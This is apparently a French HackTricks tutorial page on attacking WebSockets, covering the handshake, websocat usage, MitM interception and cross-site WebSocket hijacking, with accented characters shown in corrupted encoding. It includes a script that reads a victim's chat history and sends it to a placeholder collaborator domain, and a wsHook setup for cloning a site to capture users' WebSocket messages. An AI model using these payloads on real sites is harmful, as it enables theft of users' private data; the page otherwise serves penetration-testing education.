# Attaques WebSocket

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Qu'est-ce que les WebSockets

Les connexions WebSocket sont initi√©es via **HTTP** et sont g√©n√©ralement **√† longue dur√©e de vie**. Les messages peuvent √™tre envoy√©s dans **les deux sens √† tout moment** et ne sont pas de nature transactionnelle. La connexion restera normalement ouverte et inactive jusqu'√† ce que le client ou le serveur soit pr√™t √† envoyer un message.\
Les WebSockets sont particuli√®rement utiles dans des situations o√π des messages √† **faible latence ou initi√©s par le serveur** sont n√©cessaires, comme des flux en temps r√©el de donn√©es financi√®res.

### Comment les connexions WebSocket sont-elles √©tablies ?

(Vous trouverez ici un r√©sum√©, mais un **guide plus d√©taill√© sur la cr√©ation d'une connexion WebSocket** est disponible [**ici**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)).\
Les connexions WebSocket sont normalement cr√©√©es √† l'aide de JavaScript c√¥t√© client comme suit :
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
Le protocole **`wss`** √©tablit un WebSocket sur une connexion **TLS** chiffr√©e, tandis que le protocole **`ws`** utilise une connexion **non chiffr√©e**.

Pour √©tablir la connexion, le navigateur et le serveur effectuent une poign√©e de main WebSocket sur HTTP. Le navigateur envoie une demande de poign√©e de main WebSocket comme suit :
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Si le serveur accepte la connexion, il renvoie une r√©ponse de poign√©e de main WebSocket comme suit :
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
√Ä ce stade, la connexion r√©seau reste ouverte et peut √™tre utilis√©e pour envoyer des messages WebSocket dans les deux sens.

**Note**

Plusieurs **caract√©ristiques** des messages de **poign√©e de main** WebSocket m√©ritent d'√™tre soulign√©es :

* Les en-t√™tes **`Connection`** et **`Upgrade`** dans la requ√™te et la r√©ponse **indiquent** qu'il s'agit d'une **poign√©e de main WebSocket**.
* L'en-t√™te de requ√™te **`Sec-WebSocket-Version`** sp√©cifie la **version du protocole WebSocket** que le client souhaite utiliser. Il s'agit g√©n√©ralement de `13`.
* L'en-t√™te de requ√™te **`Sec-WebSocket-Key`** contient une **valeur al√©atoire** encod√©e en Base64, qui devrait √™tre g√©n√©r√©e al√©atoirement dans chaque requ√™te de poign√©e de main.
* L'en-t√™te de r√©ponse **`Sec-WebSocket-Accept`** contient un hachage de la valeur soumise dans l'en-t√™te de requ√™te `Sec-WebSocket-Key`, concat√©n√©e avec une cha√Æne sp√©cifique d√©finie dans la sp√©cification du protocole. Ceci est fait pour pr√©venir les r√©ponses trompeuses r√©sultant de serveurs mal configur√©s ou de proxies de mise en cache.

L'en-t√™te **`Sec-WebSocket-Key`** contient une **valeur al√©atoire** pour pr√©venir les erreurs de proxies de mise en cache, et **n'est pas utilis√© √† des fins d'authentification ou de gestion de session** (_Ce n'est pas un jeton CSRF_).

### Console Linux

Vous pouvez utiliser `websocat` pour √©tablir une connexion brute avec un websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ou pour cr√©er un serveur websocat :
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### Attaques MitM sur les connexions websocket

Si vous d√©couvrez que des clients sont connect√©s √† un **websocket HTTP** depuis votre r√©seau local actuel, vous pourriez tenter une [Attaque par Usurpation ARP](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) pour r√©aliser une attaque MitM entre le client et le serveur.\
Une fois que le client essaie de se connecter, vous pouvez alors utiliser :
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### √ânum√©ration des Websockets

Vous pouvez utiliser l'**outil** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **pour d√©couvrir, identifier et rechercher automatiquement des** **vuln√©rabilit√©s** connues dans les websockets.

### Outils de d√©bogage Websocket

* **Burp Suite** prend en charge la communication MitM websockets de mani√®re tr√®s similaire √† celle utilis√©e pour la communication HTTP r√©guli√®re.
* L'**extension Burp Suite** [**socketsleuth**](https://github.com/snyk/socketsleuth) vous permettra de mieux g√©rer les communications Websocket dans Burp en obtenant l'**historique**, en d√©finissant des **r√®gles d'interception**, en utilisant des r√®gles de **correspondance et remplacement**, en utilisant **Intruder** et **AutoRepeater**.
* [**WSSiP**](https://github.com/nccgroup/wssip) : Abr√©viation de "**WebSocket/Socket.io Proxy**", cet outil, √©crit en Node.js, fournit une interface utilisateur pour **capturer, intercepter, envoyer des messages personnalis√©s** et voir toutes les communications WebSocket et Socket.IO entre le client et le serveur.
* [**wsrepl**](https://github.com/doyensec/wsrepl) est un **REPL websocket interactif** con√ßu sp√©cifiquement pour le pentesting. Il fournit une interface pour observer les **messages websocket entrants et en envoyer de nouveaux**, avec un cadre facile √† utiliser pour **automatiser** cette communication.
* [**https://websocketking.com/**](https://websocketking.com/) est un **site web pour communiquer** avec d'autres sites en utilisant des **websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) parmi d'autres types de communications/protocoles, il fournit un **site web pour communiquer** avec d'autres sites en utilisant des **websockets**.

## Laboratoire Websocket

Dans [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) vous avez un code pour lancer un site web utilisant des websockets et dans [**ce post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) vous pouvez trouver une explication.

## D√©tournement de WebSocket inter-sites (CSWSH)

√âgalement connu sous le nom de _d√©tournement de WebSocket cross-origin_.\
**C'est un** [**Cross-Site Request Forgery (CSRF)**](csrf-cross-site-request-forgery.md) **sur une poign√©e de main WebSocket.**

Il survient lorsque la **requ√™te de poign√©e de main WebSocket** repose uniquement sur des **cookies HTTP** pour la gestion de session et **ne contient aucun jeton CSRF** ou autres valeurs impr√©visibles.\
Un attaquant peut cr√©er une **page web malveillante** sur son propre domaine qui **√©tablit une connexion WebSocket inter-sites** avec l'application vuln√©rable. L'application traitera la connexion dans le **contexte de la session de l'utilisateur victime** avec l'application.

### Attaque Simple

Notez que lors de l'**√©tablissement** d'une connexion **websocket**, le **cookie** est **envoy√©** au serveur. Le **serveur** pourrait l'utiliser pour **relier** chaque **utilisateur sp√©cifique** √† sa **session websocket bas√©e sur le cookie envoy√©**.

Ensuite, si par **exemple** le **serveur websocket** **renvoie l'historique de la conversation** d'un utilisateur si un message avec "**READY**" est envoy√©, alors un **simple XSS** √©tablissant la connexion (le **cookie** sera **envoy√© automatiquement** pour autoriser l'utilisateur victime) **envoyant** "**READY**" pourra **r√©cup√©rer** l'historique de la **conversation**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie avec un sous-domaine diff√©rent

Dans cet article de blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), l'attaquant a r√©ussi √† **ex√©cuter du Javascript arbitraire dans un sous-domaine** du domaine o√π se d√©roulait la communication par web socket. Comme il s'agissait d'un **sous-domaine**, le **cookie** √©tait **envoy√©**, et parce que le **Websocket ne v√©rifiait pas correctement l'Origine**, il √©tait possible de communiquer avec lui et **de voler des jetons**.

### Vol de donn√©es utilisateur

Copiez l'application web que vous souhaitez usurper (les fichiers .html par exemple) et dans le script o√π se d√©roule la communication websocket, ajoutez ce code :
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Maintenant, t√©l√©chargez le fichier `wsHook.js` depuis [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) et **enregistrez-le dans le dossier contenant les fichiers web**.\
En exposant l'application web et en faisant en sorte qu'un utilisateur s'y connecte, vous pourrez voler les messages envoy√©s et re√ßus via websocket :
```javascript
sudo python3 -m http.server 80
```
## Conditions de course

Les Conditions de course dans les WebSockets sont √©galement possibles, [consultez ces informations pour en savoir plus](race-condition.md#rc-in-websockets).

## Autres vuln√©rabilit√©s

Comme les Web Sockets sont un m√©canisme pour **envoyer des donn√©es au serveur et au client**, selon la mani√®re dont le serveur et le client g√®rent les informations, **les Web Sockets peuvent √™tre utilis√©s pour exploiter plusieurs autres vuln√©rabilit√©s comme XSS, SQLi ou toute autre vuln√©rabilit√© web commune en utilisant l'entr√©e d'un utilisateur √† partir d'un websocket.**

## **WebSocket Smuggling**

Cette vuln√©rabilit√© pourrait vous permettre de **contourner les restrictions des reverse proxies** en leur faisant croire qu'une **communication websocket a √©t√© √©tablie** (m√™me si ce n'est pas vrai). Cela pourrait permettre √† un attaquant d'**acc√©der √† des points de terminaison cach√©s**. Pour plus d'informations, consultez la page suivante :

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## R√©f√©rences

{% embed url="https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages" %}

<details>

<summary><strong>Apprenez le hacking AWS du d√©butant √† l'expert avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
